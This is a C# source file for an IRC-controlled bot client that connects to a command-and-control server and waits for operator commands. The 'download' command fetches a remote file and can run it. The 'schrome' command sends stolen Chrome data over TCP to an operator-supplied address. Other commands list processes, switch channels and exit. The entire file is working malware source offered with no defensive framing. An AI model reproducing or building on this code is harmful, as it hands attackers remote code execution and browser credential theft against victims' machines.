using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text.RegularExpressions;
namespace d3pl0y
{
    class Network
    {
        public static TcpClient mClient = new TcpClient();
        public static StreamWriter mWriter;
        public static StreamReader mReader;
        public static string netbuf;
        public static string cmdBuf;
        public static void Begin()
        {
 
               
                while (true)
                {
                            mClient.Connect(Config.ccServer, Config.ccPort);
                            Debug.Write("mClient not connected - retrying");
                    
        
                    if (mClient.Connected == true)
                    {
                        mWriter = new StreamWriter(mClient.GetStream());
                        mReader = new StreamReader(mClient.GetStream());
                        Recv();
                    }
                    
            }

        }
        public static void Recv()
        {
            Debug.Write("Recv() Called");
            Thread ircSetupT = new Thread(new ThreadStart(ircSetup));
            ircSetupT.Start();
            Thread cmdThread = new Thread(new ThreadStart(cmdbufParse));
            cmdThread.Start();
            while (true)
            {
                netbuf = mReader.ReadLine();
                netbufClean();
                Console.WriteLine(netbuf);
            }

        }
        public static void ircSetup()
        {
            Send("NICK " + Config.prefix + "\r\n");
            Thread tPinger = new Thread(new ThreadStart(Pinger));
            tPinger.Start();
            Send("USER fkd * fk: s\r\n");
            Thread.Sleep(10000);
            Send("JOIN " + Config.ccChan +"\r\n");
        }
        public static void Pinger()
        {
            string[] isping = null;
            while (true)
            {
                try
                {
                    isping = Regex.Split(netbuf, " :");

                    if (isping[0] == "PING")
                    {
                        Send("PONG :" + isping[1]);
                    }
                    Thread.Sleep(1000);
                }
                catch { }
            }
        }
        public static void Send(string msg)
        {
            mWriter.WriteLine(msg + "\r\n");
            mWriter.Flush();
        }
        public static void SendChan(string msg)
        {
            mWriter.WriteLine("PRIVMSG " + Config.ccChan + " :" + msg +"\r\n");
            mWriter.Flush();
            Debug.Write("SendChan() called");
        }
        public static void netbufClean()
        {
   
            try
            {

                string[] pData = Regex.Split(netbuf, " :");
                cmdBuf = pData[1];

                Debug.Write(cmdBuf);
            }
            catch { }
        }
        public static void cmdbufParse()
        {
            Debug.Write("Entered cmdbufParse()");
            netbufClean();
            while (true)
            {
                string[] spltCmd;
                try
                {
                    spltCmd = Regex.Split(cmdBuf, "!");
                    switch (spltCmd[1])
                    {
                        case "version":
                            SendChan(Config.version.ToString());
                            cmdBuf = "nothing";
                            break;
                        case "download":
                            if (spltCmd.Length != 5)
                            {
                                SendChan("[Incorrect Syntax]");
                                cmdBuf = "nothing";
                                break;
                            }
                            try
                            {
                                Thread dlthread = new Thread(() => DlExec(spltCmd[2], spltCmd[3], spltCmd[4]));
                                dlthread.Start();
                            }
                            catch { SendChan("[Incorrect Syntax]"); }
                            cmdBuf = "nothing";
                            break;
                        case "schrome":
                            if (spltCmd.Length != 4)
                            {
                                SendChan("[Incorrect Syntax]");
                                cmdBuf = "nothing";
                                break;
                            }
                            Thread ftT = new Thread(() => Network.fTransfer(Stealer.getChrome(), spltCmd[2], spltCmd[3]));
                            ftT.Start();
                            SendChan("Bot side completed, file should have transferred unless an arror occured on your receiver");
                            cmdBuf = "nothing";
                            break;
                        case "plist":
                            pTasks.getList();
                            cmdBuf = "nothing";
                            break;
                        case "migrate":
                            if (spltCmd.Length != 3)
                            {
                                SendChan("[Incorrect Syntax]");
                                cmdBuf = "nothing";
                                break;
                            }
                            Config.ccChan = spltCmd[2];
                            Send("JOIN " + Config.ccChan);
                            cmdBuf = "nothing";
                            break;
                        case "die":
                            Environment.Exit(1);
                            cmdBuf = "nothing";
                            break;
                        case "mbox":
                            if (spltCmd.Length != 3)
                            {
                                SendChan("[Incorrect Syntax]");
                                cmdBuf = "nothing";
                                break;
                            }
                            System.Windows.Forms.MessageBox.Show(spltCmd[2]);
                            cmdBuf = "nothing";
                            break;
                        default:
                            break;
                    }
                    
                }
                catch { }
            }
        }
        
        public static void fTransfer(string srcFile, string tIp, string tPort)
        {
            try
            {
                TcpClient ftClient = new TcpClient();
                ftClient.Connect(tIp, Convert.ToInt32(tPort));
                byte[] ftBuf = File.ReadAllBytes(srcFile);
                Stream ftStream = ftClient.GetStream();
                ftStream.Write(ftBuf, 0, ftBuf.Length);
                ftStream.Flush();
                
            }
            catch(Exception ex) { Debug.Write("\n\n\n\n\n" + ex.Message); }
        }

        public static void DlExec(string file, string dest, string run)
        {
            try
            {
                WebClient dlWc = new WebClient();
                dlWc.DownloadFile(file, dest);
                dlWc.Dispose();
                if (run == "1")
                {
                    System.Diagnostics.Process.Start(dest);
                }
                SendChan("File Downloaded");
            }
            catch { SendChan("File not downloaded"); Debug.Write("Error downloading/exec file"); }

        }
        
    }
}
